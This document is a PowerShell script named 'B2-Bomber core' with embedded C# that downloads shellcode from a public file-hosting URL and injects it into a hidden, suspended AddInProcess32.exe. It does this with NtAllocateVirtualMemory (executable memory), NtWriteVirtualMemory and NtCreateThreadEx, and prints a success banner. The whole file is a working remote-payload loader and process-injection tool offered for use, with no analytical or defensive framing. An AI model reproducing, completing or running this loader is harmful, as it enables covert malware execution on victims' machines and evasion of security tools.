# fatal.ps1 – B2-Bomber core, AddInProcess32 target, your shellcode
$ShellcodeUrl = "https://files.catbox.moe/nfasiv.bin"

$LoaderCode = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class Loader {
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll")]
    static extern uint NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref IntPtr RegionSize,
        uint AllocationType,
        uint Protect);

    [DllImport("ntdll.dll")]
    static extern uint NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        byte[] Buffer,
        uint NumberOfBytesToWrite,
        out uint NumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    static extern uint NtCreateThreadEx(
        out IntPtr ThreadHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle,
        IntPtr StartAddress,
        IntPtr Parameter,
        bool CreateSuspended,
        int StackZeroBits,
        int SizeOfStackCommit,
        int MaximumStackSize,
        IntPtr AttributeList);

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    public static string Execute(string url) {
        try {
            // ---- Download payload ----
            Console.WriteLine("[*] Downloading shellcode...");
            byte[] payload;
            using (var client = new System.Net.WebClient()) {
                client.Headers.Add("User-Agent", "Mozilla/5.0");
                payload = client.DownloadData(url);
            }
            Console.WriteLine("[+] Downloaded " + payload.Length + " bytes");

            // ---- Target: AddInProcess32.exe ----
            string targetPath = System.Environment.GetEnvironmentVariable("windir") +
                                @"\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe";
            Console.WriteLine("[*] Target: " + targetPath);

            // ---- Start suspended ----
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.dwFlags = 1;          // STARTF_USESHOWWINDOW
            si.wShowWindow = 0;      // SW_HIDE
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            IntPtr createResult = CreateProcess(null, targetPath, IntPtr.Zero, IntPtr.Zero,
                false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, out pi);

            if (createResult == IntPtr.Zero) {
                return "CreateProcess failed";
            }
            Console.WriteLine("[+] Process PID " + pi.dwProcessId + " (suspended)");

            // ---- Allocate memory ----
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr size = (IntPtr)payload.Length;
            uint status = NtAllocateVirtualMemory(pi.hProcess, ref baseAddress, IntPtr.Zero,
                ref size, 0x3000, 0x40);
            if (status != 0) {
                return "NtAllocateVirtualMemory failed: 0x" + status.ToString("X");
            }
            Console.WriteLine("[*] Memory at 0x" + baseAddress.ToString("X"));

            // ---- Write shellcode ----
            uint bytesWritten;
            status = NtWriteVirtualMemory(pi.hProcess, baseAddress, payload,
                (uint)payload.Length, out bytesWritten);
            if (status != 0) {
                return "NtWriteVirtualMemory failed: 0x" + status.ToString("X");
            }
            Console.WriteLine("[*] Written " + bytesWritten + " bytes");

            // ---- Create remote thread ----
            IntPtr threadHandle;
            status = NtCreateThreadEx(out threadHandle, 0x1FFFFF, IntPtr.Zero, pi.hProcess,
                baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            if (status != 0) {
                return "NtCreateThreadEx failed: 0x" + status.ToString("X");
            }
            Console.WriteLine("[+] Shellcode thread created – running");
            Console.WriteLine("[!] Main thread remains suspended to keep process alive");

            // Clear payload reference
            payload = null;
            GC.Collect();

            return "SUCCESS";
        } catch (Exception ex) {
            return "Exception: " + ex.Message + "\n" + ex.StackTrace;
        }
    }
}
"@

Write-Host "[*] Compiling loader..." -ForegroundColor Yellow
try {
    Add-Type -TypeDefinition $LoaderCode
    Write-Host "[+] Compiled successfully" -ForegroundColor Green
} catch {
    Write-Host "[-] Compilation failed: $_" -ForegroundColor Red
    exit
}

Write-Host "[*] Executing injection..." -ForegroundColor Yellow
$result = [Loader]::Execute($ShellcodeUrl)

Write-Host ""
if ($result -eq "SUCCESS") {
    Write-Host "████████████████████████████████████" -ForegroundColor Green
    Write-Host "█  INJECTION SUCCESSFUL!          █" -ForegroundColor Green
    Write-Host "█  Shellcode running in AddInProcess32 █" -ForegroundColor Green
    Write-Host "████████████████████████████████████" -ForegroundColor Green
} else {
    Write-Host "[-] FAILED: $result" -ForegroundColor Red
}
Write-Host ""